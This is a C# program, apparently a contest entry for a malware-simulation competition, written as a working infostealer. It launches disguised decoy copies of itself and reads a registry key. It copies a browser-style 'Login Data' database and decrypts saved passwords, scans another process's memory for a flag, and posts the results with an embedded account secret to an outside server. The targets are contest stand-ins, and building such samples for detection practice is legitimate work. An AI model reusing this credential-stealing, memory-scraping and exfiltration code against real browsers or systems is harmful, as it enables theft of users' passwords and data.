// Program.cs
// version: d20251209 v1.0

using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Data.SQLite;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace malv1
{
    internal class Program
    {
        // =========================
        //  Build config & secrets
        // =========================

        private const string VERSION = "malv1-20251209-1";

        // 官方 sample / 本地 Playground 用的 secret（0000...）
        private const string SECRET_DEBUG = "00000000000000000000000000000000";

        // 你比賽帳號的 secret（記得改成自己的）
        private const string SECRET_RELEASE = "8AfPntUI4d0KICm6ee6xWmqg8dBoVbDH";

#if DEBUG
        private const string BUILD_MODE = "DEBUG";
        private const string SECRET = SECRET_DEBUG;
#else
        private const string BUILD_MODE = "RELEASE";
        private const string SECRET = SECRET_RELEASE;
#endif

        // =========================
        //  Win32 常數 & 結構
        // =========================

        // 用比較保守的權限，不用 PROCESS_ALL_ACCESS，避免被 OS 拒絕
        private const int PROCESS_QUERY_INFORMATION = 0x0400;
        private const int PROCESS_VM_READ = 0x0010;

        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_NOACCESS = 0x01;
        private const uint PAGE_GUARD = 0x100;

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public UIntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId
        );

        [DllImport("kernel32.dll")]
        private static extern UIntPtr VirtualQueryEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer,
            UIntPtr dwLength
        );

        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            UIntPtr nSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        // =========================
        //  Main
        // =========================

        private static async Task Main(string[] args)
        {
            Console.WriteLine("========== [malv1 DEBUG WRAPPER] ==========");
            Console.WriteLine($"[malv1]  Version    : {VERSION}");
            Console.WriteLine($"[malv1]  Build Mode : {BUILD_MODE}");
            Console.WriteLine($"[malv1]  SECRET     : {SECRET}");
            Console.WriteLine("===========================================");

            bool isDecoy = false;

            if (args.Length > 0 && args[0] == "--decoy")
            {
                isDecoy = true;
            }
            string currentProcName = Process.GetCurrentProcess().ProcessName;
            string currentPath = Process.GetCurrentProcess().MainModule.FileName;

            if (!isDecoy)
            {
                Console.WriteLine($"[Malware-MASTER] Started as {currentProcName}. Spawning decoys...");
                SpawnDecoys(currentPath, count: 3);

                await Task.Delay(3000);
            }

            string answer1 = Challenge1();
            Console.WriteLine($"[malv1] answer_1: {answer1}");

            string answer2 = Challenge2();
            Console.WriteLine($"[malv1] answer_2: {answer2}");

            string answer3 = Challenge3();
            Console.WriteLine($"[malv1] answer_3: {answer3}");

#if DEBUG
            Console.WriteLine("[malv1] DEBUG build -> 不送出 HTTP，只做本地測試");
#else
            Console.WriteLine("[malv1] RELEASE build -> 嘗試把答案送到比賽平台");
            if (!isDecoy)
            {
                await SendAnswerToServer(JsonConvert.SerializeObject(
                    new
                    {
                        answer_1 = answer1,
                        answer_2 = answer2,
                        answer_3 = answer3,
                        secret = SECRET
                    }
                ));
            }
            else
            {
                try { Dns.GetHostEntry("www.google.com"); } catch { }
                using (HttpClient client = new HttpClient())
                {
                    await client.GetAsync("https://www.google.com");
                }
            }
#endif

            // 比賽規則沒有要求一定要退出，可以直接結束
            // 也可以 Thread.Sleep(...) 看情況
        }
        private static void SpawnDecoys(string sourcePath, int count)
        {
            try
            {
                string tempFolder = Path.GetTempPath();
                Random rnd = new Random();
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

                for (int i = 0; i < count; i++)
                {
                    char[] stringChars = new char[32];
                    for (int j = 0; j < 32; j++)
                    {
                        stringChars[j] = chars[rnd.Next(chars.Length)];
                    }
                    string randomSuffix = new string(stringChars);
                    string decoyName = $"BOMBE_EDR_FLAG_{randomSuffix}.exe";
                    string decoyPath = Path.Combine(i == 0 ? Path.GetDirectoryName(sourcePath) : tempFolder, decoyName);

                    File.Copy(sourcePath, decoyPath, true);
                    ProcessStartInfo psi = new ProcessStartInfo(decoyPath);
                    psi.Arguments = "--decoy";

                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;

                    Process.Start(psi);

                    Console.WriteLine($"[Spawn] Launched: {decoyName} with --decoy");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Spawn] Error: {ex.Message}");
            }
        }

        // =========================
        //  Challenge 1: Registry
        // =========================

        private static string Challenge1()
        {
            const string registryPath = @"SOFTWARE\BOMBE";

            try
            {
                using RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath);
                if (key == null)
                {
                    Console.WriteLine($"[C1] Registry key {registryPath} not found.");
                    return null;
                }

                object value = key.GetValue("answer_1");
                if (value == null)
                {
                    Console.WriteLine($"[C1] answer_1 not found in {registryPath}.");
                    return null;
                }

                string s = value.ToString();
                Console.WriteLine($"[C1] Registry answer_1 = {s}");
                return s;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[C1] Error reading registry: {ex.Message}");
                return null;
            }
        }

        // =========================
        //  Challenge 2: SQLite + AES
        // =========================

        private static string Challenge2()
        {
            string dbPath = @"C:\Users\bombe\AppData\Local\bhrome\Login Data";
            string tempCopy = System.IO.Path.Combine(
                System.IO.Path.GetTempPath(),
                $"bombe_copy_{Guid.NewGuid():N}.db"
            );

            byte[] key = Encoding.UTF8.GetBytes(SECRET);

            bool copySuccess = false;
            try
            {
                // 使用 cmd /c copy 進行 bitwise 複製
                var psi = new ProcessStartInfo("cmd.exe",
                    $"/c copy /Y \"{dbPath}\" \"{tempCopy}\"")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using var proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                copySuccess = proc.ExitCode == 0 && System.IO.File.Exists(tempCopy);
                Console.WriteLine(copySuccess
                    ? $"[OK] Copied to: {tempCopy}"
                    : $"[ERR] Copy failed: {error}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERR] Copy exception: {ex.Message}");
            }
            if (!copySuccess)
                return null;

            try
            {
                using SQLiteConnection conn = new SQLiteConnection($"Data Source={tempCopy};Version=3;");
                conn.Open();

                using var cmd = new SQLiteCommand(
                    "SELECT origin_url, username_value, password_value FROM logins",
                    conn
                );

                using SQLiteDataReader reader = cmd.ExecuteReader();
                while (reader.Read())
                {
                    string originUrl = reader.GetString(0);
                    string username = reader.GetString(1);
                    string passwordHex = reader.GetString(2);

                    // 官方 sample 是 username = bombe
                    if (!string.Equals(username, "bombe", StringComparison.OrdinalIgnoreCase))
                        continue;

                    Console.WriteLine($"[C2] Hit row: origin={originUrl}, user={username}");

                    byte[] encrypted = HexStringToByteArray(passwordHex);

                    if (encrypted.Length < 16)
                    {
                        Console.WriteLine("[C2] Encrypted blob too short.");
                        continue;
                    }

                    byte[] iv = new byte[16];
                    byte[] cipher = new byte[encrypted.Length - 16];
                    Buffer.BlockCopy(encrypted, 0, iv, 0, 16);
                    Buffer.BlockCopy(encrypted, 16, cipher, 0, cipher.Length);

                    try
                    {
                        string decrypted = DecryptPassword(cipher, key, iv);
                        Console.WriteLine($"[C2] Decrypted password = {decrypted}");
                        return decrypted;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[C2] Decrypt error: {ex.Message}");
                        return "Failed to decrypt";
                    }
                }

                Console.WriteLine("[C2] No matching row (username = bombe) found.");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[C2] SQLite error: {ex.Message}");
                return null;
            }
        }

        private static byte[] HexStringToByteArray(string hex)
        {
            if (hex.Length % 2 != 0)
                throw new ArgumentException("Invalid hex length", nameof(hex));

            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                string chunk = hex.Substring(i * 2, 2);
                bytes[i] = Convert.ToByte(chunk, 16);
            }
            return bytes;
        }

        private static string DecryptPassword(byte[] ciphertext, byte[] key, byte[] iv)
        {
            using Aes aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using ICryptoTransform decryptor = aes.CreateDecryptor();
            byte[] plainBytes = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
            return Encoding.UTF8.GetString(plainBytes);
        }



        // =========================
        //  Challenge 3: Scan bsass.exe
        // =========================

        private static string Challenge3()
        {
            const string targetProcessName = "bsass";
            const string pattern = @"BOMBE_MAL_FLAG_\w{32}";

            Regex regex = new Regex(pattern);

            try
            {
                Process[] procs = Process.GetProcessesByName(targetProcessName);
                if (procs.Length == 0)
                {
                    Console.WriteLine($"[C3] Process {targetProcessName}.exe not found.");
                    return null;
                }

                Process proc = procs[0];
                Console.WriteLine($"[C3] Using {proc.ProcessName}.exe (PID={proc.Id}) for scan.");

                IntPtr hProcess = OpenProcess(
                    PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                    false,
                    proc.Id
                );

                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[C3] OpenProcess failed.");
                    return null;
                }

                try
                {
                    IntPtr address = IntPtr.Zero;
                    MEMORY_BASIC_INFORMATION mbi;

                    int mbiSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));

                    while (VirtualQueryEx(hProcess, address, out mbi, (UIntPtr)mbiSize) != UIntPtr.Zero)
                    {
                        // 只看 COMMIT 的區段
                        if (mbi.State == MEM_COMMIT &&
                            mbi.RegionSize != UIntPtr.Zero &&
                            mbi.Protect != PAGE_NOACCESS &&
                            (mbi.Protect & PAGE_GUARD) == 0)
                        {
                            ulong regionSize = mbi.RegionSize.ToUInt64();
                            if (regionSize > int.MaxValue)
                            {
                                // 避免一次 alloc 太大
                                regionSize = int.MaxValue;
                            }

                            byte[] buffer = new byte[regionSize];
                            if (ReadProcessMemory(
                                    hProcess,
                                    mbi.BaseAddress,
                                    buffer,
                                    (UIntPtr)buffer.Length,
                                    out IntPtr bytesRead) &&
                                bytesRead.ToInt64() > 0)
                            {
                                int read = (int)bytesRead.ToInt64();
                                string chunk = Encoding.ASCII.GetString(buffer, 0, read);

                                Match m = regex.Match(chunk);
                                if (m.Success)
                                {
                                    Console.WriteLine($"[C3] Found flag in memory region @ {mbi.BaseAddress}");
                                    return m.Value;
                                }
                            }
                        }

                        long next = mbi.BaseAddress.ToInt64() + (long)mbi.RegionSize.ToUInt64();
                        address = new IntPtr(next);
                    }

                    Console.WriteLine("[C3] No BOMBE_MAL_FLAG found in bsass.exe memory.");
                    return null;
                }
                finally
                {
                    CloseHandle(hProcess);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[C3] Error scanning memory: {ex.Message}");
                return null;
            }
        }

        // =========================
        //  HTTP Submit
        // =========================

        private static async Task SendAnswerToServer(string jsonPayload)
        {
            using HttpClient client = new HttpClient();
            using StringContent content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            try
            {
                HttpResponseMessage response = await client.PostAsync(
                    "https://submit.bombe.top/submitMalAns",
                    content
                );

                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"[NET] Response: {responseBody}");
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine($"[NET] Request error: {e.Message}");
            }
        }
    }
}